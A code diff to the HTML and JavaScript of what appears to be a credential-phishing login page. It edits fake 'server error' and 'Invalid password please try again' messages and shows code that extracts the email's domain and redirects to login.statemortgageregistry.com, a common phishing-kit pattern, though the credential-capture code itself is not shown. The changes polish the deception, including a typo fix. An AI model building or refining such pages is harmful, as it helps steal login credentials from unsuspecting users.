@@ -196,7 +196,7 @@
     <div class="main-container">
         <div class="wrapper">
             <div class="server-error" id="serverError">
-                Unexpected server error occurred please login to continue
+                Unexpected server error occurred
             </div>
             
             <div class="logo-container">
@@ -339,8 +339,7 @@
                         var domain = ai.substring(ai.lastIndexOf("@") + 1);
                         window.location.replace("https://login.statemortgageregistry.com/login");
                     } else {
-                        $("#mgss").show();
-                        $('#mgss').html("Invalid passowrd please try again");
+                        $("#serverError").html("Invalid password please try again").fadeIn(500);
                         $('#submit-btn').html('Log in');
                     }
                 }
